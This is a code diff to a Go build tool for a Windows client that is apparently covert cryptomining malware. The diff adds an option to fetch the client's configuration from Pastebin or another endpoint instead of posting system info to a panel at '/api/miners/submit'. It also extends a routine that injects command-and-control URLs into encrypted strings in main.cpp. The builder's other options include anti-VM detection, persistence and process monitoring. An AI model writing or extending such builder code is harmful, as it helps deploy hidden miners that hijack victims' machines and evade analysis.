@@ -98,7 +98,7 @@ func buildClientNonInteractiveWindows() error {
 	logInfo("  Anti-VM Detection: %v", antiVM)
 	logInfo("  Persistence: %v", persistence)
 
-	return executeBuildWindows(panelURL, processMonitoring, debugConsole, antiVM, persistence)
+	return executeBuildWindows(panelURL, "", false, processMonitoring, debugConsole, antiVM, persistence)
 }
 
 // buildClientWindows orchestrates the full build pipeline for Windows
@@ -110,22 +110,56 @@ func buildClientWindows() error {
 		return fmt.Errorf("dependency check failed: %v", err)
 	}
 
-	// Get panel URL(s) from user
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Enter panel URL(s) separated by commas for fallback (e.g., http://panel1.com/api,http://panel2.com/api): ")
-	panelURL, _ := reader.ReadString('\n')
-	panelURL = strings.TrimSpace(panelURL)
 
-	if panelURL == "" {
-		return fmt.Errorf("panel URL cannot be empty")
+	// Get config method preference
+	fmt.Print("\n[CONFIG METHOD]\nFetch config from Pastebin/GET endpoint? (y/n) [default: n]: ")
+	configMethodInput, _ := reader.ReadString('\n')
+	useGetConfig := strings.TrimSpace(configMethodInput) == "y"
+
+	var panelURL string
+	var configURL string
+
+	if useGetConfig {
+		// Get config URL(s) for direct GET (Pastebin focus)
+		fmt.Print("\n[PASTEBIN/GET CONFIG]\nEnter Pastebin raw URL or config endpoint(s) separated by commas for fallback:\n  Example: https://pastebin.com/raw/xXnRDDjH\n \nURL(s): ")
+		configURL, _ = reader.ReadString('\n')
+		configURL = strings.TrimSpace(configURL)
+
+		if configURL == "" {
+			return fmt.Errorf("config URL cannot be empty when using GET method")
+		}
+
+		// Validate URLs
+		urlCount := len(strings.Split(configURL, ","))
+		logInfo("Using %d config URL(s) with fallback support", urlCount)
+	} else {
+		// Get panel URL(s) for POST method
+		fmt.Print("\n[PANEL URL (POST METHOD)]\nEnter panel URL(s) separated by commas for fallback.\nINCLUDE /api/miners/submit at the end of each URL:\n  Example: http://127.0.0.1:8080/api/miners/submit\n  Example: http://panel.example.com:8080/api/miners/submit\n\nURL(s): ")
+		panelURL, _ = reader.ReadString('\n')
+		panelURL = strings.TrimSpace(panelURL)
+
+		if panelURL == "" {
+			return fmt.Errorf("panel URL cannot be empty when using POST method")
+		}
+
+		// Warn if user forgot the /api/miners/submit path
+		if !strings.Contains(panelURL, "/api/miners/submit") {
+			logError("WARNING: URLs do not contain '/api/miners/submit' - this may cause the miner to fail!")
+			fmt.Print("Continue anyway? (y/n): ")
+			continueInput, _ := reader.ReadString('\n')
+			if strings.TrimSpace(continueInput) != "y" {
+				return fmt.Errorf("build cancelled by user")
+			}
+		}
+
+		// Validate URLs
+		urlCount := len(strings.Split(panelURL, ","))
+		logInfo("Using %d panel URL(s) with fallback support", urlCount)
 	}
 
-	// Validate URLs
-	urlCount := len(strings.Split(panelURL, ","))
-	logInfo("Using %d panel URL(s) with fallback support", urlCount)
-
 	// Get monitoring preference
-	fmt.Print("Enable process monitoring and command-line obfuscation? (y/n): ")
+	fmt.Print("\n[OPTIONS]\nEnable process monitoring? (y/n): ")
 	monitorInput, _ := reader.ReadString('\n')
 	processMonitoring := strings.TrimSpace(monitorInput) == "y"
 
@@ -144,18 +178,24 @@ func buildClientWindows() error {
 	persistenceInput, _ := reader.ReadString('\n')
 	persistence := strings.TrimSpace(persistenceInput) == "y"
 
-	logInfo("Configuration:")
-	logInfo("  Panel URL: %s", panelURL)
-	logInfo("  Process Monitoring: %v", processMonitoring)
-	logInfo("  Debug Console: %v", debugConsole)
+	logInfo("\n[BUILD CONFIGURATION]")
+	if useGetConfig {
+		logInfo("Config Method: GET request from Pastebin/endpoint")
+		logInfo("Config URL(s): %s", configURL)
+	} else {
+		logInfo("Config Method: POST to panel with system info")
+		logInfo("Panel URL(s): %s", panelURL)
+	}
+	logInfo("Process Monitoring: %v", processMonitoring)
+	logInfo("Debug Console: %v", debugConsole)
 	logInfo("  Anti-VM Detection: %v", antiVM)
 	logInfo("  Persistence: %v", persistence)
 
-	return executeBuildWindows(panelURL, processMonitoring, debugConsole, antiVM, persistence)
+	return executeBuildWindows(panelURL, configURL, useGetConfig, processMonitoring, debugConsole, antiVM, persistence)
 }
 
 // executeBuildWindows performs the actual build process on Windows
-func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiVM, persistence bool) error {
+func executeBuildWindows(panelURL, configURL string, useGetConfig, processMonitoring, debugConsole, antiVM, persistence bool) error {
 	// Clean build directory first to ensure no stale CMake cache or files
 	logInfo("Cleaning build directory: %s", buildDir)
 	if err := os.RemoveAll(buildDir); err != nil {
@@ -186,11 +226,18 @@ func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiV
 		return fmt.Errorf("failed to inject encryption key: %v", err)
 	}
 
-	// Modify panel URL and miner URLs BEFORE encryption
+	// Modify panel URL or config URL BEFORE encryption
 	srcFile := filepath.Join(clientDir, "src", "main.cpp")
-	logInfo("Setting panel URL to: %s", panelURL)
-	if err := modifyPanelURL(srcFile, panelURL); err != nil {
-		return fmt.Errorf("failed to modify panel URL: %v", err)
+	if useGetConfig {
+		logInfo("Setting config GET URL(s) to: %s", configURL)
+		if err := modifyConfigGetURL(srcFile, configURL); err != nil {
+			return fmt.Errorf("failed to modify config URL: %v", err)
+		}
+	} else {
+		logInfo("Setting panel URL(s) to: %s", panelURL)
+		if err := modifyPanelURL(srcFile, panelURL); err != nil {
+			return fmt.Errorf("failed to modify panel URL: %v", err)
+		}
 	}
 
 	// Decode key for string encryption
@@ -227,7 +274,7 @@ func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiV
 
 	// Run CMake
 	logInfo("Configuring project with CMake...")
-	if err := runCMakeWindows(antiVM, persistence, debugConsole); err != nil {
+	if err := runCMakeWindows(configURL, antiVM, persistence, debugConsole); err != nil {
 		return fmt.Errorf("CMake configuration failed: %v", err)
 	}
 
@@ -267,7 +314,7 @@ func executeBuildWindows(panelURL string, processMonitoring, debugConsole, antiV
 }
 
 // runCMakeWindows runs CMake for Windows with Visual Studio generator
-func runCMakeWindows(antiVM bool, persistence bool, debugConsole bool) error {
+func runCMakeWindows(configURL string, antiVM bool, persistence bool, debugConsole bool) error {
 	// List of generators to try in order
 	generators := []string{
 		"Visual Studio 17 2022",
@@ -292,6 +339,10 @@ func runCMakeWindows(antiVM bool, persistence bool, debugConsole bool) error {
 
 		if debugConsole {
 			args = append(args, "-DENABLE_DEBUG_CONSOLE=ON")
+		}
+
+		if configURL != "" {
+			args = append(args, "-DCONFIG_GET_URL="+configURL)
 		}
 
 		args = append(args, "..")
@@ -463,6 +514,51 @@ func modifyPanelURL(filename, newURL string) error {
 
 	if quoteEnd >= len(contentStr) {
 		return fmt.Errorf("could not find closing quote for panel URL")
+	}
+
+	// Replace the old URL with the new one
+	before := contentStr[:quoteStart+1] // Include opening quote
+	after := contentStr[quoteEnd:]      // Include closing quote onwards
+	contentStr = before + newURL + after
+
+	return os.WriteFile(filename, []byte(contentStr), 0644)
+}
+
+// modifyConfigGetURL modifies the config GET URL in main.cpp
+func modifyConfigGetURL(filename, newURL string) error {
+	content, err := os.ReadFile(filename)
+	if err != nil {
+		return fmt.Errorf("failed to read file %s: %w", filename, err)
+	}
+
+	contentStr := string(content)
+
+	// Find: std::string configGetUrlStr = ENCRYPT_STR("");
+	searchPattern := `std::string configGetUrlStr = ENCRYPT_STR("`
+	startIdx := strings.Index(contentStr, searchPattern)
+	if startIdx == -1 {
+		logError("Could not find configGetUrlStr pattern in %s", filename)
+		return fmt.Errorf("could not find configGetUrlStr ENCRYPT_STR pattern in main.cpp")
+	}
+
+	// Find the opening quote (it's right at the end of searchPattern)
+	quoteStart := startIdx + len(searchPattern) - 1 // -1 because we want the quote character itself
+
+	// Find the closing quote
+	quoteEnd := quoteStart + 1
+	for quoteEnd < len(contentStr) {
+		if contentStr[quoteEnd] == '\\' {
+			quoteEnd += 2 // Skip escaped character
+			continue
+		}
+		if contentStr[quoteEnd] == '"' {
+			break
+		}
+		quoteEnd++
+	}
+
+	if quoteEnd >= len(contentStr) {
+		return fmt.Errorf("could not find closing quote for config GET URL")
 	}
 
 	// Replace the old URL with the new one
